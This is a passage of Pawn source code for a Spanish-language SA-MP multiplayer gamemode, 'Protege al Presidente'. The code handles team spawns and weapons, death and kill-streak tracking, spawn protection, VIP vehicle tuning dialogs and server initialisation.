					SetPlayerPos(playerid, -2249.2786-random(20),538.1824,35.0938);
					SetPlayerFacingAngle(playerid, 268.4550);
				}
				case CIVIL:
				{
					SetPlayerPos(playerid, -2275.6699,93.0918+random(100),35.1641);
					SetPlayerFacingAngle(playerid, 180.8280);
				}
		    }
			SetPlayerWorldBounds(playerid, -934.23, -2977.858, 1669.936, -1097.72);//Límite para San Fierro
		    if(!(IsMapLoading != false))
			{
				for(new i = 9; i <= 12; ++i)
					GangZoneShowForPlayer(playerid, i, ((i == 9) ? (0xFFFF0077) : ((i == 10) ? (0x006BD777) : ((i == 11) ? (0xAA333377) : ((i == 12) ? (0xFFA00077) : (-1))))));
			}
		}
	}
    ResetPlayerWeapons(playerid);
	switch(Data[playerid][Teams])
	{
		case PRESIDENT:
		{
		    if(id_president == INVALID_PLAYER_ID)
				id_president = playerid;
			Minutes = 15;
			Timer_President = repeat TimeLeft_President();
			new string[58];
			new name[24];
			GetPlayerName(playerid, name, sizeof(name));
			format(string, sizeof(string), "* %s es el nuevo Presidente.", name);
			SendClientMessageToAll(Amarillo, string);
			TextDrawSetString(TextTL, "~b~15 minutos restante");
			foreach(new i : Player)
			{
  				if(TimeLeft[i][TEXT_DRAW])
					TextDrawShowForPlayer(i, TextTL);
			}
			SetPlayerArmour(playerid, 99999);
			Weapons(playerid, WEAPON_DEAGLE, 800, WEAPON_FLOWER, 1, WEAPON_GOLFCLUB, 1);
		}
		case VICEPRESIDENT:
		{
		    if(id_vicepresident == INVALID_PLAYER_ID)
				id_vicepresident = playerid;
			SetPlayerArmour(playerid, 99999);
			Weapons(playerid, WEAPON_SILENCED, 800, WEAPON_FLOWER, 1, WEAPON_GOLFCLUB, 1);
		}
		case SECURITY:
		{
		    SetPlayerArmour(playerid, 50);
			Weapons(playerid, WEAPON_SAWEDOFF, 8000, WEAPON_MP5, 8000, WEAPON_M4, 8000);
		}
		case POLI:
		{
		    SetPlayerArmour(playerid, 0);
			Weapons(playerid, WEAPON_DEAGLE, 800, WEAPON_UZI, 8000, WEAPON_M4, 8000);
		}
		case SWAT:
  		{
  		    SetPlayerArmour(playerid, 0);
			Weapons(playerid, WEAPON_DEAGLE, 800, WEAPON_SHOTGUN, 8000, WEAPON_TEC9, 8000);
		}
		case TERRO:
		{
		    SetPlayerArmour(playerid, 0);
			SetPlayerTeam(playerid, TERRO);
			Weapons(playerid, WEAPON_TEC9, 8000, WEAPON_SHOTGSPA, 8000, WEAPON_AK47, 8000);
			Data[playerid][TeamPresident] = -1;/* Si guardamos un -1 en la matriz, significa que ese jugador no pertenece al equipo del presidente. */
		}
		case CIVIL:
		{
		    SetPlayerArmour(playerid, 0);
			SetPlayerTeam(playerid, NO_TEAM);
			Weapons(playerid, WEAPON_DILDO, 1, WEAPON_DEAGLE, 800, WEAPON_SHOTGUN, 8000);
			Data[playerid][TeamPresident] = -1;/* Si guardamos un -1 en la matriz, significa que ese jugador no pertenece al equipo del presidente. */
		}
	}
	if(Data[playerid][Teams] >= PRESIDENT && Data[playerid][Teams] <= SWAT)
	{
		SetPlayerTeam(playerid, 0);
		Data[playerid][TeamPresident] = 0; /* Si guardamos un 0 en la matriz, significa que ese jugador pertenece al equipo del presidente. */
	}
	if(IsMapLoading)
	{
		ResetPlayerWeapons(playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if((TimeLeft[playerid][TEXT_DRAW]) && (id_president != INVALID_PLAYER_ID))
	    TextDrawShowForPlayer(playerid, TextTL);
	if((TimeLeft[playerid][TEXT_DRAW]) && (id_president == INVALID_PLAYER_ID))
		TextDrawHideForPlayer(playerid, TextTL);
	TextDrawHideForPlayer(playerid, Texto);
	TextDrawShowForPlayer(playerid, TextPAP[0]);
	TextDrawShowForPlayer(playerid, TextPAP[1]);
	SetPlayerColor(playerid, GetTeamColor(playerid));
	SetPlayerSkin(playerid, ((Data[playerid][SkinGuarded] != -1) ? (Data[playerid][SkinGuarded]) : (Data[playerid][SkinClass])));
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid, 6969);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	if((playerid == id_president) && (Data[id_president][Teams] != PRESIDENT))
	{ //Restricción para evitar algún bug por un presidente que no "existe"
	    id_president = INVALID_PLAYER_ID;
	    stop Timer_President;
	}
	if((playerid == id_vicepresident) && (Data[id_vicepresident][Teams] != VICEPRESIDENT))
	    id_vicepresident = INVALID_PLAYER_ID;
	if(!IsMapLoading && !Data[playerid][ASK])
	{
        TimePositionSuccess[playerid] = gettime() + 5;
		Data[playerid][SpawnKill] = repeat IsPlayerExitArea(playerid);
		Data[playerid][LabelASK] = Create3DTextLabel("Bajo protección de spawn", 0xFF00FFFF, 30.0, 40.0, 50.0, 40.0, 0);
		Attach3DTextLabelToPlayer(Data[playerid][LabelASK], playerid, 0.0, 0.0, 0.7);
		SetPlayerHealth(playerid, 99999);
		Data[playerid][ASK] = true;
	}
	if(id_president == INVALID_PLAYER_ID)
		SendClientMessage(playerid, 0x97FF2FFF, "* ¡No hay presidente por el momento! ¡Escriba /rc o /clase para ser el presidente!");
	SendClientMessage(playerid, 0x00FF80FF, "* Usa /deber para saber cual es tu objetivo dentro del juego");
	SendClientMessage(playerid, 0x00FF80FF, "* Además, selecciona tu skin con /cskin");
	if(VIP[playerid][Vset])
	{
	    GivePlayerWeapon(playerid, WEAPON_CHAINSAW, 1);
	    GivePlayerWeapon(playerid, WEAPON_SNIPER, 125);
	}
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);//Borra el límite que hayas puesto antes
	SendDeathMessage(killerid, playerid, reason);
	++Data[playerid][Deaths];
	WriteData(playerid, DEATHS);
	Data[playerid][KillingSpree] = 0;

	if(Data[playerid][ForcePlayer] == JUGADOR_SI_FORZADO)
		Data[playerid][ForcePlayer] = JUGADOR_MUERTO_FORZADO;

	if(Data[playerid][IsKillingSpree] == true) /* La variable va a toma el valor de "true" si el jugador es la persona de la mayor racha. */
	{
		Data[playerid][IsKillingSpree] = false;
		MayorRacha = 1;
		TextDrawDestroy(TextSpree[0]);
	    foreach(new i : Player)
	    {
	        if(MostrarRachas[i] == true)
	        {
				TextDrawHideForPlayer(i, TextSpree[1]);
				TextDrawHideForPlayer(i, TextSpree[2]);
			}
			else continue;
		}
	}

	if(!(killerid == INVALID_PLAYER_ID))
	{
		new string[98];
		new gunname[32];
		new Float:X;
		new Float:Y;
		new Float:Z;
		new name1[24];
		new name2[24];
		GetPlayerName(playerid, name1, sizeof(name1));
		GetPlayerName(killerid, name2, sizeof(name2));
		GetPlayerPos(playerid, X, Y, Z);
		GetWeaponName(reason, gunname, 32);
		format(string, sizeof(string), "* Haz matado a %s(%d) |Distancia: %0.2f m| |Arma: %s|", name1, playerid, GetPlayerDistanceFromPoint(killerid, X, Y, Z), gunname);
		SendClientMessage(killerid, 0x97FF2FFF, string);
		format(string, sizeof(string), "* Usted fue asesinado por %s(%d) |Distancia: %0.2f m| |Arma: %s|", name2, killerid, GetPlayerDistanceFromPoint(killerid, X, Y, Z), gunname);
		SendClientMessage(playerid, 0x97FF2FFF, string);
		SetPlayerScore(killerid, GetPlayerScore(killerid)+1);
		SetPlayerScore(playerid, GetPlayerScore(playerid)-1);
		++Data[killerid][Kills];
		WriteData(killerid, KILLS);

		if(++Data[killerid][KillingSpree] > MayorRacha)
		{
			new str1[24 + 3];
			new str2[31];
			new name[24];
			GetPlayerName(killerid, name, sizeof(name));
    		MayorRacha = Data[killerid][KillingSpree];
			Data[killerid][IsKillingSpree] = true;
			new len = strlen(name);
			for(new i = 0; i < len; ++i)
			{
	    		if(name[i] == '[')
	        		name[i] = '(';
				else if(name[i] == ']')
		    		name[i] = ')';
			}
			format(str1, sizeof(str1), "~y~%s", name);
			format(str2, sizeof(str2), "~y~%d asesinatos ~w~sin morir", Data[killerid][KillingSpree]);
			if(MayorRacha > 2)
				TextDrawDestroy(TextSpree[0]);
			/* Creación del textdraw */
			TextSpree[0] = TextDrawCreate(Position[len - 3], 417.000000, "mrdave");
			TextDrawBackgroundColor(TextSpree[0], 255);
			TextDrawFont(TextSpree[0], 3);
			TextDrawLetterSize(TextSpree[0], 0.379999, 1.200000);
			TextDrawColor(TextSpree[0], -1);
			TextDrawSetOutline(TextSpree[0], 1);
			TextDrawSetProportional(TextSpree[0], 1);
			/* Alteración de cada cadena */
			TextDrawSetString(TextSpree[0], str1);
			TextDrawSetString(TextSpree[2], str2);
			/* Mostramos todos los textdraws */
			foreach(new i : Player)
			{
			    if(MostrarRachas[i] == true)
			    {
					TextDrawShowForPlayer(i, TextSpree[0]);
					TextDrawShowForPlayer(i, TextSpree[1]);
					TextDrawShowForPlayer(i, TextSpree[2]);
				}
				else continue;
			}
		}
	}
	if(Data[playerid][Teams] == PRESIDENT)
	{
	    Data[playerid][Teams] = ((((killerid != INVALID_PLAYER_ID) && (Data[killerid][Teams] == TERRO)) ? (PRESIDENTE_MUERTO_1) : (((killerid != INVALID_PLAYER_ID) && (Data[killerid][Teams] == CIVIL)) ? (PRESIDENTE_MUERTO_2) : (PRESIDENTE_MUERTO_3))));
        Data[playerid][ForcePlayer] = JUGADOR_SI_FORZADO;//le damos un valor para saber que el presidente estaba en la selección de clases
		++Data[playerid][PD];//sumamos +1 una muerte al presidente que murió
		WriteData(playerid, PRESIDENT_DEATHS);
		ForceClassSelection(playerid);//forzamos al presidente para ir a la seleción de clases
		SetPlayerMap(((id_vicepresident != INVALID_PLAYER_ID) ? (SI_HAY_PRESIDENTE) : (NO_HAY_PRESIDENTE)));
	}
	if((killerid != INVALID_PLAYER_ID) && (Data[killerid][Teams] == PRESIDENT))
	{
		++Data[killerid][PK];
		WriteData(killerid, PRESIDENT_KILLS);
	}
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
    // si la id del jugador quién causó el daño llega ser inválida, la condición será verdadera
	if(issuerid == INVALID_PLAYER_ID) return 1;
	if((weaponid >= 0 && weaponid <= 15) || (weaponid >= 22 && weaponid <= 34))
		PlayerPlaySound(issuerid, 17802, 0.0, 0.0, 0.0);

	if(Data[issuerid][ASK] == true || Data[playerid][ASK] == true)
	{
		ShowPlayerDialog(issuerid, 5, DIALOG_STYLE_MSGBOX, "{FF0000}<Advertencia>", ((Data[issuerid][ASK] == true) ? ("{FFFFFF}Aún te encuentras bajo protección de spawn, por esa razón no puedes causar daño a nadie.") : ("{FFFFFF}Ese jugador se encuentra bajo protección de spawn, por esa razón no le puedes causar daño.")), "Cerrar", "");
  		if(weaponid == WEAPON_VEHICLE) //si el daño es ocasionado con un vehículo
    	{
			new Float:x;
			new Float:y;
			new Float:z;
			GetPlayerPos(playerid, x, y, z);
			SetPlayerPos(playerid, x, y, z+2);
    	}
	  	if((Data[playerid][ASK] == false) && (Data[issuerid][ASK] == true))
		// si el jugador quién recibió el daño no llega ser protegido por la protección de spawn y el usuario quién causó el daño llega a estar bajo protección de spawn, la condición se cumple.
  		{
  		    if(Data[issuerid][Teams] != CIVIL)
  		    //Todo el bloque de código de abajo se ejecutará siempre y cuando el jugador quién causó el daño no sea de la clase CIVIL.
  		    {
  		    	if(Data[issuerid][Teams] == Data[playerid][Teams])
  		    	//Esta condición se la usa para los jugadores que estén en una misma clase, a excepción de los civiles. Ejemplo: (Policía con Policía, Terrorista con Terrorista).
  		    	{
  		        	return 1;
  		    	}
  		    	if((Data[issuerid][TeamPresident] == 0) && (Data[playerid][TeamPresident] == 0))
  		    	//Esta condición se la usa para los jugadores que estén en diferentes clases; pero son aliados. Ejemplo: (Policía con SWAT, Seguridad con SWAT).
  		    	{
  		        	return 1;
  		    	}
  		    }
  		    new Float:armour;
  		    GetPlayerArmour(playerid, armour);
			if(armour > 0) // si el chaleco del jugador quién recibió el daño llega a ser mayor que 0, la condición se cumple.
			{
	    		SetPlayerArmour(playerid, (armour + amount) - amount); //le damos la armadura que tenía el jugador antes que reciba el daño.
	    		return 1;
			}
			new Float:health;
			GetPlayerHealth(playerid, health);
    		SetPlayerHealth(playerid, (health + amount) - amount); //le damos la vida que tenía el jugador antes que reciba el daño.
  		}
	}
	return 1;
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(hittype == BULLET_HIT_TYPE_PLAYER) //si el tipo de golpe es para un jugador
	{
	    if(hitid != INVALID_PLAYER_ID) //si la id del jugador es inválido
	    {
	        if(Data[playerid][ASK] == true || Data[hitid][ASK] == true)
	        {
	        	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "{FF0000}<Advertencia>", ((Data[playerid][ASK] == true) ? ("{FFFFFF}Aún te encuentras bajo protección de spawn, por esa razón no puedes causar daño a nadie.") : ("{FFFFFF}Ese jugador se encuentra bajo protección de spawn, por esa razón no le puedes causar daño.")), "Cerrar", "");
				return 0;
			}
		}
	}
	return 1;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid >= Skin_Class[E_SECURITY] && listid <= Skin_Class[E_CIVIL])
	{
		if(response == 0) return 1;
		SetPlayerSkin(playerid, modelid);
		Data[playerid][SkinClass] = modelid;
		return 1;
	}
	if(listid == armas_vip)
	{
 		if(response == 0) return 1;
		switch(modelid)
		{
			case MODEL_9MM:
				pc_cmd_colt45(playerid);
			case MODEL_SNIPER:
 				pc_cmd_sniper(playerid);
			case MODEL_RIFLE:
 				pc_cmd_rifle(playerid);
			case MODEL_KATANA:
 				pc_cmd_kata(playerid);
			case MODEL_MOTOSIERRA:
 				pc_cmd_saw(playerid);
		}
		return 1;
	}
	if(listid == skins_vip)
	{
		if(response == 0) return 1;
		new skin[10];
		SetPlayerSkin(playerid, modelid);
		Data[playerid][SkinClass] = modelid;
		format(skin, sizeof(skin), "SKIN: %d", modelid);
		GameTextForPlayer(playerid, skin, 3000, 3);
		PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
		return 1;
	}
	if(listid == ruedas_vip)
	{
 		if(response == 0)
 		{
 			if(VIP[playerid][Autotune])
 				VIP[playerid][Autotune] = false;
 			return 1;
 		}
		new NameWheels[9];
		GetNameWheels(modelid, NameWheels);
		GameTextForPlayer(playerid, NameWheels, 3000, 3);
		if(!VIP[playerid][Wheels])
			VIP[playerid][SaveWheels_ID] = modelid;
		AddVehicleComponent(GetPlayerVehicleID(playerid), modelid);
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
 		if(VIP[playerid][Autotune])
 		{
 			pc_cmd_guardarrueda(playerid);
			pc_cmd_autotune(playerid);
 		}
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	//print("DEBUG: OnDialogResponse (PAPV3.pwn)");
	DialogSound playerid;
	switch(dialogid)
	{
	    case DIALOG_TL:
	    {
			if(response != 1) return 1;
			if(listitem == 0) //Si se elige la opción de "Mostrar el tiempo restante en TextDraw"
			{
			    TimeLeft[playerid][TEXT_DRAW] = ((TimeLeft[playerid][TEXT_DRAW] == true) ? (false) : (true));
				WriteData(playerid, TL_TEXTDRAW);
				if((id_president != INVALID_PLAYER_ID) && (TimeLeft[playerid][TEXT_DRAW] == true))
				//Si hay un presidente y se elige la opción del 'si', la condición se cumple.
				{
					new timeleft[25];
					format(timeleft, sizeof(timeleft), "~b~%d %s", Minutes, ((Minutes == 1) ? ("minuto restante") : ("minutos restantes")));
					TextDrawSetString(TextTL, timeleft);
					TextDrawShowForPlayer(playerid, TextTL);
				}
				if((id_president != INVALID_PLAYER_ID) && (TimeLeft[playerid][TEXT_DRAW] == false))
				//Si hay un presidente y se elige la opción del 'no', la condición se cumple.
				    TextDrawHideForPlayer(playerid, TextTL);
				pc_cmd_tl(playerid);
			}
			else //Caso contrario, se cumple la otra opción
			{
			    TimeLeft[playerid][GAME_TEXT] = ((TimeLeft[playerid][GAME_TEXT] == true) ? (false) : (true));
			    WriteData(playerid, TL_GAMETEXT);
			    pc_cmd_tl(playerid);
			}
	    }
		case DIALOG_CMDS_1:
		{
		    if(response)
		    {
				new cmds_nivel1[1479];
				strcat(cmds_nivel1, "Lista de comandos para los jugadores que sí están registrados dentro del servidor:\n\n");
				strcat(cmds_nivel1, "* /siduelo - Te permite activar los duelos, es decir, te podrán enviar una invitación\n");
				strcat(cmds_nivel1, "* /noduelo - Te permite desactivar los duelos, es decir, no te podrán enviar una invitación\n");
				strcat(cmds_nivel1, "* /r - Te permite enviar una respuesta rápida a los mensajes privados.\n");
				strcat(cmds_nivel1, "* /sipm -  Le permite recibir mensajes privados nuevamente\n");
				strcat(cmds_nivel1, "* /nopm -  Evita que recibas mensajes privados\n");
				strcat(cmds_nivel1, "* /nombre - Cambia el nombre de tu cuenta, siempre y cuando el comando esté disponible de usar\n");
				strcat(cmds_nivel1, "* /cambiarpass -  Le permite cambiar la contraseña de su cuenta\n");
				strcat(cmds_nivel1, "* /tpmcolor -  Cambia el color del teamchat\n");
				strcat(cmds_nivel1, "* /ej o /eject o presionando Y - Te expulsa de un Rustler o Hydra, esto explota el vehículo;\n");
				strcat(cmds_nivel1, "  Y te da un paracaídas para aterrizar\n\n");
				strcat(cmds_nivel1, "* /cigarro - Te da un cigarro para fumar bien rico\n");
				strcat(cmds_nivel1, "* /vino - Te da una botella de vino para que la puedas tomar\n");
				strcat(cmds_nivel1, "* /cerveza - Hace que tu personaje se emborrache\n");
				strcat(cmds_nivel1, "* /racha o /spree -  Te permite ver tu racha de asesinatos y también de los demás\n");
				strcat(cmds_nivel1, "* /showspree -  Muestra la mejor racha de asesinatos en un textdraw\n");
				strcat(cmds_nivel1, "* /hidespree - Oculta la mejor racha de asesinatos que se muestra en un textdraw\n");
				strcat(cmds_nivel1, "* /rol - Te permite hablar como terrorista o swat o policía, esto dependerá en que clase estés.\n");
				strcat(cmds_nivel1, "* /tl - Te permite mostrar u ocultar el tiempo restante en textdraw o en anuncio\n");
				strcat(cmds_nivel1, "* /pk -  Elimina a un pasajero seleccionado de su vehículo\n");
				strcat(cmds_nivel1, "* /pka - Elimina a todos los pasajeros de su vehículo\n");
    			ShowPlayerDialog(playerid, DIALOG_CMDS_2, DIALOG_STYLE_MSGBOX, "Comandos Nivel 1", cmds_nivel1, "Atrás", "Cerrar");
			}
			else
				return 1;
		}
		case DIALOG_CMDS_2:
		{
			if(response)
			    pc_cmd_comandos(playerid);
			else
			    return 1;
		}
		case DIALOG_TEAM:
		{
			if(response == 0) return 1;
			if(listitem >= 0 && listitem <= 6)
			{
				if(Data[playerid][TimeSelectTeam] > gettime())
				{
				    SendClientMessage(playerid, Rojo, "ERROR: Debes esperar 15 segundos para volver a cambiarte de equipo.");
					return 1;
				}
				++listitem;
				if((listitem == PRESIDENT) && (Data[playerid][President] > gettime()))
				{
				    SetPlayerTimeCMD(playerid, "para volver a escoger la clase de Presidente", Data[playerid][President], 15);
					return SetPlayerSelectTeam(playerid);
				}
				if((listitem == VICEPRESIDENT) && (Data[playerid][VicePresident] > gettime()))
				{
 					SetPlayerTimeCMD(playerid, "para volver a escoger la clase de VicePresidente", Data[playerid][VicePresident], 15);
					return SetPlayerSelectTeam(playerid);
				}
				if(Data[playerid][Teams] == listitem)
				{
					SendClientMessage(playerid, Rojo, "ERROR: Usted ya se encuentra en esa clase.");
					return SetPlayerSelectTeam(playerid);
				}
				if((listitem == PRESIDENT) && (id_president != INVALID_PLAYER_ID))
				{
				    SendClientMessage(playerid, Rojo, "ERROR: Ya hay un Presidente.");
					return SetPlayerSelectTeam(playerid);
				}
				if((listitem == VICEPRESIDENT) && (id_vicepresident != INVALID_PLAYER_ID))
				{
				    SendClientMessage(playerid, Rojo, "ERROR: Ya hay un VicePresidente.");
				    return SetPlayerSelectTeam(playerid);
				}
				if(Data[playerid][Level] == 0 || Data[playerid][Level] == 1)
				{
				    if(!TeamBalance(listitem))
				    {
				        SendClientMessage(playerid, Rojo, "ERROR: En este momento la clase se encuentra llena.");
						return SetPlayerSelectTeam(playerid);
					}
				}
				/* Se le suma un +1 al parámetro "listitem", porque las id de cada equipo no comienza desde 0. */
				Data[playerid][TimeSelectTeam] = gettime() + 15;
				SetPlayerSkinRandom(playerid, listitem);
				Data[playerid][Teams] = listitem;
				if(listitem == VICEPRESIDENT)
				{
					new string[58];
					new name[24];
					GetPlayerName(playerid, name, sizeof(name));
					format(string, sizeof(string), "* %s es el nuevo VicePresidente.", name);
					SendClientMessageToAll(Amarillo, string);
				}
				SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);//Borra el límite que hayas puesto antes
				OnPlayerSpawn(playerid);
			}
		}
		
        case DIALOG_AUTOTUNE:
		{
			if(!response)
			{
	    		VIP[playerid][Autotune] = false;
	    		return 1;
			}
			switch(listitem)
			{
	    		case 0:
	    		{
	        		pc_cmd_guardarnos(playerid);
	        		pc_cmd_autotune(playerid);
		 		}
				case 1:
				{
				    if(VIP[playerid][ColorPrimary] != -1)
					{
					    pc_cmd_guardarcolor(playerid);
					    pc_cmd_autotune(playerid);
					    return 1;
					}
		    		VIP[playerid][Autotune] = true;
		    		pc_cmd_pinturas(playerid);
				}
				case 2:
				{
		    		pc_cmd_hidraulicos(playerid);
					pc_cmd_autotune(playerid);
				}
				case 3:
				{
				    if(VIP[playerid][Wheels])
				    {
				        pc_cmd_guardarrueda(playerid);
				        pc_cmd_autotune(playerid);
				        return 1;
				    }
		    		VIP[playerid][Autotune]= true;
		    		pc_cmd_ruedas(playerid);
				}
			}
		}
		
		case DIALOG_COLORS_PRIMARY:
		{
			if(response == 0)
			{
			    if(VIP[playerid][Autotune])
			        VIP[playerid][Autotune] = false;
				return 1;
			}
			if(listitem >= 0 && listitem <= 7)
			{
				VIP[playerid][DialogPrimary] = listitem; //Guardamos el color primario seleccionado por el jugador
				ShowPlayerDialog(playerid, DIALOG_COLORS_SECUNDARY, DIALOG_STYLE_LIST, "Colores Secundarios", "Negro\nBlanco\nCeleste\nRojo\nGris\nRosado\nAmarillo\nAzul", "Seleccionar", "Cerrar");
			}
		}

		case DIALOG_COLORS_SECUNDARY:
		{
			if(response == 0)
			{
				SendClientMessage(playerid, Rojo, "ERROR: Usted debe seleccionar un color secundario.");
				return ShowPlayerDialog(playerid, DIALOG_COLORS_SECUNDARY, DIALOG_STYLE_LIST, "Colores Secundarios", "Negro\nBlanco\nCeleste\nRojo\nGris\nRosado\nAmarillo\nAzul", "Seleccionar", "Cerrar");
			}
			if(listitem >= 0 && listitem <= 7)
			{
  				new str[56];
  				format(str, sizeof(str), "{FF9900}ID Color primario: %d - ID Color secundario: %d", VIP[playerid][DialogPrimary], listitem);
  				SendClientMessage(playerid, Amarillo, str);
  				SendClientMessage(playerid, Amarillo, "{FF9900}Nota: {FFFFFF}No todos los vehículos tienen un color secundario.");
				ChangeVehicleColorEx(GetPlayerVehicleID(playerid), VIP[playerid][DialogPrimary], listitem);
				PlayerPlaySound(playerid, 1134, 0.0, 0.0, 0.0);
				VIP[playerid][DialogPrimary] = -1;
				if(VIP[playerid][Autotune]) //Si tiene activo el auto-ajustes
				{
				    pc_cmd_guardarcolor(playerid);
				    pc_cmd_autotune(playerid);
				}
			}
		}

		case DIALOG_TPMCOLOR:
		{
			if(response == 0) return 1;
			if(listitem >= 0 && listitem <= 9)
			{
				new str[83];
				Data[playerid][TPMColor] = Colours[listitem][E_TPM_COLORID];
				format(str, sizeof(str), "* El color de chat de su equipo se ha configurado para: %s", Colours[listitem][E_NAME_TPM_COLOR]);
				SendClientMessage(playerid, 0x80FF00FF, str);
			}
		}
	}
	return 1;
}

public OnGameModeExit()
{
	//print("DEBUG: OnGameModeExit");
	stop Timer_President;
	if(MayorRacha > 1)
	{
		TextDrawDestroy(TextSpree[0]);
		TextDrawDestroy(TextSpree[1]);
		TextDrawDestroy(TextSpree[2]);
	}
	TextDrawDestroy(TextPAP[0]);
	TextDrawDestroy(TextPAP[1]);
	return 1;
}

public OnGameModeInit()
{
	//printf("DEBUG: OnGameModeInit (PAPV3.pwn)");
	if(!(fexist("Dadmin") == 1))
		return print("ERROR: Falta la carpeta Dadmin en scriptfiles.");
	if(!(fexist("Dadmin/Usuarios") == 1))
		return print("ERROR: Falta la carpeta Usuarios incluirla en Dadmin.");
	INI_ParseFile("cmds.txt", "Commands",.bExtra = false);
	Skin_Class[E_SECURITY] = LoadModelSelectionMenu("Dadmin/skins_security.txt");
	Skin_Class[E_POLICE] = LoadModelSelectionMenu("Dadmin/skins_poli.txt");
	Skin_Class[E_SWAT] = LoadModelSelectionMenu("Dadmin/skins_swat.txt");
	Skin_Class[E_TERRO] = LoadModelSelectionMenu("Dadmin/skins_terro.txt");
	Skin_Class[E_CIVIL] = LoadModelSelectionMenu("Dadmin/skins_civil.txt");
	armas_vip = LoadModelSelectionMenu("Dadmin/armas_vip.txt");
	skins_vip = LoadModelSelectionMenu("Dadmin/skins_vip.txt");
	ruedas_vip = LoadModelSelectionMenu("Dadmin/ruedas_vip.txt");
	CountMaps = 1;
	City = VENTURAS;
	MayorRacha = 1;
	id_president = INVALID_PLAYER_ID;
	id_vicepresident = INVALID_PLAYER_ID;
	Kicked = true;
	CommandName = false;
	new map[21];
	format(map, sizeof(map), "mapname %s", GetMapName(City));
	SendRconCommand(map);
	SendRconCommand("hostname Protege al Presidente");
	SendRconCommand("weburl facebook.com/groups/ProtegeAlPresidente");
	SendRconCommand("language Español");
	SetGameModeText("Protege al Presidente");
	//EnableStuntBonusForAll(1);
	UsePlayerPedAnims();
	DisableInteriorEnterExits();
	EnableVehicleFriendlyFire();
	/* Gang Zones "Las Venturas" */
	//Presidente, vicepresidente y seguridad
	GangZoneCreate(947.3376, 1001.35, 1166.009, 1171.545);
	//Policía
	GangZoneCreate(2232.032, 2397.722, 2368.702, 2471.215);
	//SWAT
	GangZoneCreate(2263.271, 2340.0857, 2376.511, 2467.347);
	//TERRORISTA
	GangZoneCreate(1228.487, 2645.278, 1415.919, 2707.167);
	//CIVILES
	GangZoneCreate(2411.655, 1480.99, 2583.469, 1612.505);
	/* Gang Zones "Los Santos" */
	//Presidente, vicepresidente y seguridad
	GangZoneCreate(1105.779, -2096.375, 1307.329, -2001.629);
	//Policía & SWAT
	GangZoneCreate(1535.499, -1741.078, 1626.767, -1606.855);
	//TERRORISTA
	GangZoneCreate(1607.753, -1137.074, 1699.021, -1022.589);
	//CIVILES
	GangZoneCreate(2136.347, -1227.872, 2174.376, -1125.23);
	/* Gang Zones "San Fierro" */
	//Presidente, vicepresidente y seguridad
	GangZoneCreate(-2699.835, -48.96741, -2603.268, 49.6567);
	//Policía & SWAT
	GangZoneCreate(-1699.399, 633.5114, -1560.343, 751.8604);
	//TERRORISTA
	GangZoneCreate(-2309.704, 515.1625, -2213.136, 578.2819);
	//CIVILES
	GangZoneCreate(-2313.566, 69.38152, -2255.626, 235.07);
	/* Objetos para la selección de clases */
	CreateObject(12990, 4495.664063, -2510.759155, 2.373306, 0.0000, 0.0000, 270.0000);
	CreateObject(13145, 4589.05, -2580.68, 30.90,   0.00, 0.00, 90.00);
	/* Pickup de San Fierro */
	AddStaticPickup(1240, 3, -2625.7224,210.4586,4.6209);//vida
	AddStaticPickup(1242, 3, -2357.4741,1007.8342,50.8984);//chaleco
	AddStaticPickup(1240, 3, -1456.4299,1500.8383,6.9688);//vida
	AddStaticPickup(1242, 3, -2111.2688,-444.0200,38.7344);//chaleco
	AddStaticPickup(1240, 3, -1757.7292,962.9088,24.8828);//vida
	AddStaticPickup(1242, 3, -1750.7778,962.6926,24.8828);//chaleco
	/* Pickup de Las Venturas */
	AddStaticPickup(1242, 3, 2637.2034,1128.5149,11.1797);//chaleco
	AddStaticPickup(1240, 3, 2156.9280,943.1653,10.8203);//vida
	AddStaticPickup(1242, 3, 2000.4783,1550.1896,13.5995);//chaleco
	AddStaticPickup(1240, 3, 2000.5225,1538.3048,13.5859);//vida
	AddStaticPickup(1242, 3, 2832.6008,2399.5635,11.0625);//chaleco
	AddStaticPickup(1240, 3, 2536.1555,2083.9502,10.8203);//vida
	/* Pickup de Los Santos */
	AddStaticPickup(1240, 3, 1177.6949,-1323.0242,14.0834);//vida
	AddStaticPickup(1242, 3, 1721.5927,-1881.5479,13.5649);//chaleco
	AddStaticPickup(1240, 3, 1704.6733,-1881.6581,13.5691);//vida
	AddStaticPickup(1242, 3, 478.9765,-1499.2694,20.4801);//chaleco
	AddStaticPickup(1240, 3, 2038.3618,-1411.2306,17.1641);//vida
	AddStaticPickup(1242, 3, 2520.0537,-1483.1400,23.9996);//chaleco
	AddStaticPickup(1240, 3, 2401.6936,-1980.3127,13.5469);//vida
	new i = -1, len = (sizeof(Skins));
	while(++i < len)
	{
		AddPlayerClass(Skins[i], 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0);
	}
	
	TextTL = TextDrawCreate(498.000000, 99.000000, "~b~15 minutos restante");
	TextDrawBackgroundColor(TextTL, 255);
	TextDrawFont(TextTL, 1);
	TextDrawLetterSize(TextTL, 0.270000, 1.300000);
	TextDrawColor(TextTL, -1);
	TextDrawSetOutline(TextTL, 1);
	TextDrawSetProportional(TextTL, 1);
	
	TextPAP[0] = TextDrawCreate(500.000000, 12.000000, "pap v3.0");
	TextDrawBackgroundColor(TextPAP[0], 255);
	TextDrawFont(TextPAP[0], 3);
	TextDrawLetterSize(TextPAP[0], 0.460000, 1.000000);
	TextDrawColor(TextPAP[0], -1);
	TextDrawSetOutline(TextPAP[0], 1);
	TextDrawSetProportional(TextPAP[0], 1);

	TextPAP[1] = TextDrawCreate(44.000000, 429.000000, "PROTEGE AL PRESIDENTE");
	TextDrawBackgroundColor(TextPAP[1], 255);
